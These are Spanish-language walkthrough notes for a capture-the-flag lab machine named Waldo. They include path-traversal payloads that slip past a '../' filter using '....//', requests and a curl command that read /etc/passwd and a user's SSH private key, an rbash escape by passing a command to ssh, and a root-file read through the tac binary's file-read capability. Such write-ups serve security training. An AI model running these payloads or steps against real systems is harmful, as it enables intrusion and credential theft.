PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos al puerto 80 y nos encontramos una web que nos permite crear listas, parece que no hay nada interesante a simple vista

-Interceptamos la petición con BurpSuite para ve si está pasando algo interesante por detrás:
	-Interceptamos en:
		-http://10.10.10.87/list.html
	-Contenido BurpSuite:
		POST /dirRead.php HTTP/1.1
		Host: 10.10.10.87
		Connection: keep-alive
		Referer: http://10.10.10.87/list.html
		path=./.list/
			-Response:
				[".","..","list1"]

-Parece que está incluyendo archivos de la máquina , pero en vez de hacerlo por GET, lo está haciendo por POST

-Puede tratarse de un PATH TRAVERSAL,  vamos a hacer unas pruebas:
	-Probamos la estructura básica:
		-path=./.list/../../../../../../etc/passwd (No funciona)
	-Probamos a ver el código fuente del archivo .php con Wrappers:
		-path=./php://filter/convert.base64-encode/resource=dirRead.php
		(No funciona)
	-path=./.list/....//		[".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
	(Hemos conseguido ir un directorio para atrás, saltándonos el filtro con ....//)

-SI apuntamos a 'dirRead.php', solo nos permite listar directorios

-Si apuntamos al archivo fileRead.php nos permite listar archivos, cambiando el parámetro a 'file':
	POST /fileRead.php HTTP/1.1
	Host: 10.10.10.87
	file=./.list/....//....//....//....//etc/passwd
		-VEMOS EL /ETC/PASSWD!!!

-Podemos ver el contenido del archivo **'DirRead'**, para ver la sanitización que se estaba empleando:
	POST /fileRead.php HTTP/1.1
	Host: 10.10.10.87
	file=./.list/....//dirRead.php
		-Vemos el contenido , el filtro funciona contra ../ , pero no contra ....//

-Vamos a probar si podemos listar la clave privada(id_rsa ) de algún usuario, apuntamos a dirRead.php para listar los archivos que hay en los directorios:
	POST /dirRead.php HTTP/1.1
	Host: 10.10.10.87
	path=./.list/....//....//....//....//....//home
		[".","..","nobody"]
		(Tenemos el usuario 'nobody')
	-path=./.list/....//....//....//....//....//home/nobody
		[".","..",".ash_history",".ssh",".viminfo","user.txt"]
		(Hay un directorio .ssh!!)
	-path=./.list/....//....//....//....//....//home/nobody/.ssh/
		[".","..",".monitor","authorized_keys","known_hosts"]

-Ahora, apuntamos al archivo 'fileRead.php' para leer la clave privada de ssh:
	POST /fileRead.php HTTP/1.1
	Host: 10.10.10.87
	file=./.list/....//....//....//....//....//home/nobody/.ssh/.monitor
		-Vemos la clave Privada del usuario 'monitor'!!

-Leemos la clave privada del usuario nobody:
	POST /fileRead.php HTTP/1.1
	Host: 10.10.10.87
	file=./.list/....//....//....//....//....//home/nobody/.ssh/.monitor
		-Sale pero en un formato que no me gusta
	-Lo hacemos con Curl, con los siguientes parámetros , para que salga el output bien:
		-curl -s -X POST "http://10.10.10.87/fileRead.php" -d 'file=./.list/....//....//....//....//....//home/nobody/.ssh/.monitor' | jq '.["file"]' -r
			**-jq:** Sirve para procesar datos en formato JSON
			**-'.["file"]':** Extrae el valor del campo 'file' del objeto JSON
			-r: Modo **raw output**, imprime el contenido tal como es.

-Creamos un archico id_rsa y le damos los permisos necesarios:
	-chmod 600 id_rsa

-Nos conectamos:
	-ssh -i id_rsa nobody@10.10.10.87
		waldo:/$ whoami
			nobody

## Escalada de Privilegios

-Antes habíamos visto en el archivo authorized_keys que había un usuario extraño:
	-monitor@waldo (El cual no está en esta sesión de ssh)

-Nos conectamos a ssh por localhost con la clave privada del usuario 'monitor':
	-waldo:~/.ssh$ ssh -i .monitor monitor@localhost
		monitor@waldo:~$

-Estamos en una 'rbash' (Restricted bash), la cual no nos deja ejecutar muchos comandos

-Para entrar con una bash normal hacemos lo siguiente:
	1-Nos salimos de la actual rbash 
		monitor@waldo:~$ exit
			waldo:~/.ssh$ 
			(Hemos vuelto a la anterior)
	2-Podemos ejecutar un comando a la hora de autenticarnos y lo ejecuta antes de darnos la rbash:
		-waldo:~/.ssh$ ssh -i .monitor monitor@localhost "cat /etc/passwd"
			-Nos ha ejecutado el comando, con lo que nos hemos saltado la rbash (Solo para ejecutar el comando)
	3-Obtener una bash completa:
		-waldo:~/.ssh$ ssh -i .monitor monitor@localhost bash
			whoami (No podemos hacer tratamiento de la tty)
				monitor

-Listamos capabilities:
	-/sbin/getcap -r / 2>/dev/null
		/usr/bin/tac = cap_dac_read_search+ei
		(Nos permite leer cualquier archivo con el binario 'tac', que es como cat pero te sale el contenido al reves)

-Leemos el root.txt:
	-/usr/bin/tac /root/root.txt


